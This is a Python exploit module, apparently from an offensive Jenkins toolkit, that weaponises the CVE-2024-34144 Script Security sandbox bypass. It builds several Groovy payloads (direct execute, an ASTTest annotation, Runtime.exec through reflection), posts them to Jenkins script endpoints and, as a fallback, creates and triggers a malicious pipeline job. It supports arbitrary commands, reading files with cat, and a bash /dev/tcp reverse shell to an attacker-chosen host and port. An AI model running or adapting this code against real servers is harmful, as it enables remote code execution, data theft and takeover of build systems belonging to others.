"""
CVE-2024-34144: Jenkins Script Security Plugin Sandbox Bypass

This exploit leverages a critical sandbox bypass vulnerability in the Script Security plugin
that allows attackers with permission to run sandboxed scripts to execute arbitrary code
via crafted constructor bodies.
"""

from typing import Any

from jenkins_breaker.modules.base import ExploitMetadata, ExploitModule, ExploitResult


class CVE_2024_34144(ExploitModule):
    """Jenkins Script Security plugin sandbox bypass via crafted constructors."""

    CVE_ID = "CVE-2024-34144"

    METADATA = ExploitMetadata(
        cve_id="CVE-2024-34144",
        name="Jenkins Script Security Sandbox Bypass",
        description="Sandbox bypass via crafted constructor bodies allowing arbitrary code execution",
        affected_versions=["Script Security Plugin <= 1335.vf07d9ce377a_e"],
        mitre_attack=["T1059.006", "T1190", "T1068"],
        severity="critical",
        references=[
            "https://www.jenkins.io/security/advisory/2024-05-02/",
            "https://nvd.nist.gov/vuln/detail/CVE-2024-34144",
            "https://www.wiz.io/vulnerability-database/cve/cve-2024-34144"
        ],
        requires_auth=True,
        requires_crumb=True,
        tags=["rce", "sandbox-bypass", "groovy", "script-security"]
    )

    def check_vulnerable(self, session: Any, **kwargs: Any) -> bool:
        """
        Check if the target Jenkins instance is vulnerable.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments

        Returns:
            bool: True if vulnerable, False otherwise
        """
        try:
            response = session.get("/scriptApproval/")
            return response.status_code in [200, 403]
        except Exception:
            return False

    def run(self, session: Any, **kwargs: Any) -> ExploitResult:
        """
        Exploit CVE-2024-34144 for sandbox bypass and code execution.

        This uses crafted constructor bodies to bypass the Groovy sandbox and
        execute arbitrary code.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments
                - command (str): Command to execute
                - file_path (str): File to read (alternative to command)
                - lhost (str): Listener host for reverse shell
                - lport (int): Listener port for reverse shell

        Returns:
            ExploitResult: Result of the exploit
        """
        command = kwargs.get('command')
        file_path = kwargs.get('file_path')
        lhost = kwargs.get('lhost')
        lport = kwargs.get('lport', 4444)

        if lhost:
            command = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        elif file_path:
            command = f"cat {file_path}"
        elif not command:
            command = "id"

        groovy_payload = f"""
class Exploit {{
    Exploit() {{
        def proc = "{command}".execute()
        proc.waitFor()
        println proc.text
    }}
}}

new Exploit()
"""

        alternative_payload = f"""
@groovy.transform.ASTTest(value={{
    def proc = ['/bin/sh', '-c', '{command}'].execute()
    def output = proc.text
    println output
}})
class SandboxBypass {{}}
new SandboxBypass()
"""

        constructor_bypass_payload = f"""
class ExploitConstructor {{
    {{
        def runtime = Class.forName('java.lang.Runtime')
        def getRuntime = runtime.getMethod('getRuntime', null)
        def r = getRuntime.invoke(null, null)
        def exec = r.getClass().getMethod('exec', String.class)
        def process = exec.invoke(r, '{command}')
        def inputStream = process.getInputStream()
        def result = inputStream.text
        println result
    }}
}}
new ExploitConstructor()
"""

        payloads = [
            ("Constructor bypass", constructor_bypass_payload),
            ("ASTTest annotation", alternative_payload),
            ("Direct execution", groovy_payload),
        ]

        endpoints = [
            "/scriptText",
            "/script",
            "/pipeline-syntax/checkScriptCompile",
        ]

        for endpoint in endpoints:
            for payload_name, payload in payloads:
                try:
                    data = {"script": payload.strip()}

                    response = session.post(endpoint, data=data)

                    if response.status_code == 200:
                        output = response.text.strip()

                        if output and len(output) > 0:
                            return ExploitResult(
                                exploit=self.CVE_ID,
                                status="success",
                                details=f"Sandbox bypass successful via {payload_name}",
                                data={
                                    "method": payload_name,
                                    "endpoint": endpoint,
                                    "command": command,
                                    "output": output,
                                    "output_length": len(output)
                                }
                            )

                except Exception:
                    continue

        pipeline_script = f"""
pipeline {{
    agent any
    stages {{
        stage('Exploit') {{
            steps {{
                script {{
                    class SandboxBypass {{
                        {{
                            def cmd = '{command}'
                            def proc = cmd.execute()
                            proc.waitFor()
                            println proc.text
                        }}
                    }}
                    new SandboxBypass()
                }}
            }}
        }}
    }}
}}
"""

        job_name = f"exploit-{self.CVE_ID.replace('-', '_')}"

        job_config = f"""<?xml version='1.1' encoding='UTF-8'?>
<flow-definition plugin="workflow-job">
  <description>CVE-2024-34144 Exploit</description>
  <definition class="org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition">
    <script>{pipeline_script}</script>
    <sandbox>true</sandbox>
  </definition>
</flow-definition>"""

        try:
            create_response = session.post(
                f"/createItem?name={job_name}",
                headers={"Content-Type": "application/xml"},
                data=job_config
            )

            if create_response.status_code in [200, 302]:
                build_response = session.post(f"/job/{job_name}/build")

                if build_response.status_code in [200, 201, 302]:
                    return ExploitResult(
                        exploit=self.CVE_ID,
                        status="success",
                        details=f"Sandbox bypass job created and triggered: {job_name}",
                        data={
                            "job_name": job_name,
                            "command": command,
                            "method": "Pipeline with constructor bypass",
                            "note": "Check job console output for command results"
                        }
                    )

        except Exception:
            pass

        return ExploitResult(
            exploit=self.CVE_ID,
            status="failure",
            details="Sandbox bypass failed on all payloads and methods",
            error="All exploitation attempts were blocked or target is patched"
        )

    def cleanup(self, session: Any, **kwargs: Any) -> None:
        """
        Cleanup after exploitation by deleting created jobs.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments
        """
        job_name = f"exploit-{self.CVE_ID.replace('-', '_')}"
        try:
            session.post(f"/job/{job_name}/doDelete")
        except Exception:
            pass
